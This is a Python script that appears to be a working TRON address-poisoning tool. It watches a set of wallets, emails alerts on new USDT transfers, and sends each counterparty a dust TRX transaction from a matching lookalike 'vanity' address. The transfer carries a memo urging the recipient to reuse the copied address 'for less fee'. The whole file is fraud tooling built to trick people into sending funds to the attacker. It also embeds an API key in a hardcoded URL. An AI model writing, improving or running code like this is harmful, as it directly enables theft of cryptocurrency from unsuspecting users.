import requests
import smtplib
import os
import time
import json
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from tronpy.keys import to_base58check_address
from decimal import Decimal

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")

GETBLOCK_URL = "https://go.getblock.io/a9f8a09df1d04f80acb3b9509c857e5e"

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
    print("Missing email config.")
    exit(1)
if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses or keys.")
    exit(1)

client = Tron(HTTPProvider(endpoint_uri="https://api.tronstack.io"))
last_tx_ids = {}

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"Error checking contract address: {e}")
        return False

def hex_to_base58(hex_address):
    return to_base58check_address(bytes.fromhex(hex_address))

def get_latest_transaction(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "tron_gettransactionfromaddress",
            "params": {
                "address": wallet_address,
                "only_confirmed": True,
                "limit": 1
            },
            "id": 1
        }

        headers = {"Content-Type": "application/json"}
        response = requests.post(GETBLOCK_URL, headers=headers, data=json.dumps(payload), timeout=10)

        if response.status_code != 200:
            print(f"GetBlock API failed for {wallet_address}. Status: {response.status_code}")
            return None

        data = response.json()
        txs = data.get("result", {}).get("transactions", [])
        return txs[0] if txs else None

    except Exception as e:
        print(f"Error fetching transaction for {wallet_address}: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("Email sent.")
    except Exception as e:
        print("Failed to send email:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        print(f"Freezing {freeze_amount} TRX for bandwidth on address: {address}")
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = (
            client.trx.freeze_balance(
                owner_address=address,
                amount=int(freeze_amount * 1_000_000),
                duration=3,
                resource="BANDWIDTH"
            ).build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print("✅ Freeze success. TxID:", result.get("id", "n/a"))
    except Exception as e:
        print("❌ Failed to freeze TRX:", e)

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            print(f"Aborting: {to_address} is a contract address.")
            return

        print(f"Sending {amount} TRX from {from_address} to {to_address}")
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        print(f"Balance: {balance} TRX")

        if balance < amount:
            print("Not enough balance. Trying to freeze TRX for bandwidth...")
            freeze_trx_for_bandwidth(from_address, priv_key_hex)
            return

        txn = (
            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
            .memo(f"reuse_usdt_address_copy_from_{from_address}_for_less_fee")
            .build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print(f"TRX sent. TxID: {result.get('id', 'n/a')}")
    except Exception as e:
        print("Failed to send TRX:", e)

print("Starting TRON monitor...")

if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
    send_email("Monitor Active", "TRON wallet monitor is running.")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            print(f"🔍 Checking address: {my_address}")
            tx = get_latest_transaction(my_address)
            if tx:
                tx_id = tx.get("txID")
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id

                    contract_data = tx["raw_data"]["contract"][0]["parameter"]["value"]
                    sender = hex_to_base58(contract_data["owner_address"])
                    receiver = hex_to_base58(contract_data["to_address"])
                    amount = int(contract_data.get("amount", 0)) / 1e6

                    if amount < 1:
                        print(f"⚠️ Skipping transaction < 1 USDT: {amount}")
                        continue

                    interacting_address = receiver if sender == my_address else sender

                    if interacting_address in WALLET_ADDRESSES or interacting_address in VANITY_ADDRESSES:
                        print(f"Skipping self or system address: {interacting_address}")
                        continue

                    if is_contract_address(interacting_address):
                        print(f"Skipping contract address: {interacting_address}")
                        continue

                    subject = f"Inflow for {my_address}"
                    body = f"""
New USDT transaction:

Wallet: {my_address}
Amount: {amount} USDT
From: {sender}
To: {receiver}
TxID: {tx_id}
View: https://tronscan.org/#/transaction/{tx_id}
"""
                    print(body)
                    send_email(subject, body)
                    send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
                else:
                    print("⏸ No new transaction.")
            else:
                print(f"⏸ No transaction found for {my_address}")
            time.sleep(1)
    except Exception as e:
        print("Monitoring error:", e)

    print("Sleeping 30s...\n")
    time.sleep(30)
